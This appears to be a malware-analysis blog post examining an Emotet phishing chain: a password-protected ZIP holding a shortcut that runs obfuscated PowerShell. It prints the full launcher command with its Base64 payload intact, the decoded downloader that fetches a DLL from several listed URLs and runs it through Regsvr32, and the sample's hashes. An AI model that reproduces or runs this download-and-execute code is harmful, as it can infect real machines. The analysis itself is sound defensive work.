---
layout: post
title: "Basic Emotet Analysis"
date: 2022-05-13
categories: malware analysis, emotet
---
## Summary
This sample was delivered to the victim via a phishing email posing as a legitimate local contact.
The lure was an invoice due to the victim, which was contained in a ZIP file attached to the email: "INVOICE_2022-04-28_1755_from_/<name/>.zip" 
The ZIP file was password protected, and the password was included in the email body.
Contained within the ZIP archive is a single shortcut file named "payments_2022-04-28_1775".
According to VirusTotal, the final payload is Emotet.

### Investigate Shortcut File
When reviewing the shortcut file, we see the following Target:
'''
C:\Windows\system32\cmd.exe /v:on /c oH3foTTmbaqkzma84gi/Hjtik33DbBFpFOpWwk172sp5TSBv+sahF3cunUGp79vnlDv4zXjR||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c "&{\[System.Text.Encoding\]::ASCII.GetString(\[System.Convert\]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW5
'''

So far, what we can see is that the shortcut is calling cmd.exe with a few arguments.

Since the argument passed to powershell.exe is cut off, I ran the shortcut in my VM and located the process execution event in Sysmon to get the entire argument sent to Powershell, listed below:
'''powershell
powershell.exe  -c "&{\[System.Text.Encoding\]::ASCII.GetString(\[System.Convert\]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2dtaGVhbHRoY2FyZS5kb3Rob21lLmNvLmtyL2Nzcy9SVDZGRzkvIiwiaHR0cDovL2duci5ndHUuZ2UvYWRtaW4veUtnWU4ySzBtWVkvIiwiaHR0cDovL2hhZnN0cm9tLm51L2ZSOFRBV0VFbS8iLCJodHRwOi8vZ3JlZXpseS5mci93cC1jb250ZW50L084UjFWeVJpMTZYcUtDZ29lVEsvIiwiaHR0cDovL2hjc25ldC5jb20uYnIvd3AtY29udGVudC9lbW1LLyIsImh0dHA6Ly9ncnVwb2JhdGlzdGVsbGEuY29tLmJyL3dwLWNvbnRlbnQvYlYySk1XWnovIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL2FxUHhjY29PUEcuUVl3O1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvYXFQeGNjb09QRy5RWXc7YnJlYWt9IGNhdGNoIHsgfX0=')) > "C:\Users\WDAGUtilityAccount\AppData\Local\Temp\tRiZqSzUYZ.ps1"; powershell -executionpolicy bypass -file "\$env:TEMP\tRiZqSzUYZ.ps1"; Remove-Item -Force "$env:TEMP\tRiZqSzUYZ.ps1"}"
'''

### Decoding the obfuscated Powershell
Using CyberChef to decode the Base64 string gives us the following (formatting cleaned up for readability):
```powershell
\$ProgressPreference="SilentlyContinue";
\$links=("hXXp://gmhealthcare.dothome.co[.]kr/css/RT6FG9/","hXXp://gnr.gtu[.]ge/admin/yKgYN2K0mYY/","hXXp://hafstrom[.]nu/fR8TAWEEm/","hXXp://greezly[.]fr/wp-content/O8R1VyRi16XqKCgoeTK/","hXXp://hcsnet.com[.]br/wp-content/emmK/","hXXp://grupobatistella.com[.]br/wp-content/bV2JMWZz/");
foreach ($u in $links) {
	try {
		IWR $u -OutFile $env:TEMP/aqPxccoOPG.QYw;
		Regsvr32.exe $env:TEMP/aqPxccoOPG.QYw;
		break
		} 
	catch { }
}
```

### Breakdown of the de-obfuscated Powershell
Set Powershell preference to continue without prompting on errors:
```powershell
\$ProgressPreference="SilentlyContinue";
```


Define a list of URLs to reach out to to download additional stages/information:
```powershell
$links=("hXXp://gmhealthcare.dothome.co[.]kr/css/RT6FG9/","hXXp://gnr.gtu[.]ge/admin/yKgYN2K0mYY/","hXXp://hafstrom[.]nu/fR8TAWEEm/","hXXp://greezly[.]fr/wp-content/O8R1VyRi16XqKCgoeTK/","hXXp://hcsnet.com[.]br/wp-content/emmK/","hXXp://grupobatistella.com[.]br/wp-content/bV2JMWZz/");
```

Using the alias IWR for Invoke-WebRequest, try to reach out to each URL in the list. Whatever file is downloaded is sent to '$env:TEMP', which on my machine is equivalent to "%localappdata%\temp". [Regsvr32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) is used to register and deregister DLLs on the system, so we can probably assume the download is going to be a DLL.
```powershell
foreach ($u in $links) {
	try {
		IWR $u -OutFile $env:TEMP/aqPxccoOPG.QYw;
		Regsvr32.exe $env:TEMP/aqPxccoOPG.QYw;
		break
		} 
	catch { }
}
```

The entire decoded Base64 command is redirected to "%localappdata%\Temp\tRiZqSzUYZ.ps1" and then executed. 
When running the IWR portion of the script, three of the indicated domains accepted connections from my PC.
The first URL, "hXXp://gmhealthcare.dothome.co[.]kr/css/RT6FG9/", resulted in a file saved as 'aqPxcco0PG.QYw', opened in PEView, and found it's actually an HTML document. The title of the page is "닷홈 | 페이지를 표시할 수 없습니다." which is Korean according to Google Translate: "dot home | The page cannot be displayed."
Trying to reach this URL in a browser shows a 404 page, leading me to believe that the page that was hosting the DLL is now down.
I removed this URL from the list and ran the script again to try to get a copy of the DLL to inspect, and this time I did receive a non-HTML file in return from "hXXp://gnr.gtu[.]ge/admin/yKgYN2K0mYY/".

### Inspecting the suspicious download
Running Sysinternals Strings on the file shows a number of strings that are potentially interesting (but meaningless to me). There was, however, one string that stood out to me: Project1.dll; when inspecting the DLL in PEView, we can see the same string appearing in the .edata section listed near a number of the exported functions:
![PEView exports]({{ site.url }}/assets/img/Pastedimage20220513164914.png)
While inspecting the PE headers, I also found the compile time is listed as 28 April 2022 at 11:54pm UTC. Opening the file in Dependency Walker shows the same list of function exports as PEView:
![Dependancy Walker Exports]({{ site.url }}/assets/img/Pastedimage20220513165110.png)
DLL file summary:
- Filename: aqPxccoOPG.QYw
- VirusTotal link: https://www.virustotal.com/gui/file/717082965c7ef28706cf74a56ab841e9cc664e8f8024b1c64d7c411278dee3ae/detection
- MD5 hash: 48cf6778b6146642db586d837fce2508
- SHA1 hash: ea4860a33d84975df1c468e58ce5ced495b3f626
